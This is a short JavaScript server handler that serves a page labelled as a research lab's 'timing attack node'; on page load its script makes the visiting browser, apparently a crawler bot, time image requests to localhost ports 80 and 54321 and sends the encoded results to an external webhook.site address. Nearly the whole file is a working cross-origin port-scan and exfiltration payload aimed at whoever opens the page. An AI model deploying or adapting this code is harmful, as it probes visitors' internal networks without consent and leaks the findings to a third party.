export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <body>
        <pre>NyxSec Research Lab: Timing Attack Node</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";

          async function probePort(port) {
            const start = Date.now();
            return new Promise((resolve) => {
              const img = new Image();
              
              // Timeout 5 detik agar bot tidak menggantung jika port di-drop firewall
              const timer = setTimeout(() => {
                img.src = ""; // Batalkan pemuatan
                resolve({ port, time: Date.now() - start, status: "timeout" });
              }, 5000);

              img.onload = img.onerror = () => {
                clearTimeout(timer);
                resolve({ port, time: Date.now() - start, status: "finished" });
              };

              // Cache-busting agar tidak diambil dari cache internal Google
              img.src = "http://127.0.0.1:" + port + "/favicon.ico?v=" + start;
            });
          }

          async function runTest() {
            // Bandingkan port 80 (potensi open) vs 54321 (potensi closed)
            const results = [];
            results.push(await probePort(80));
            results.push(await probePort(54321));

            // Kirim hasil perbandingan ke Webhook
            fetch(webhook + "?results=" + btoa(JSON.stringify(results)));
          }

          runTest();
        </script>
      </body>
    </html>
  `);
}
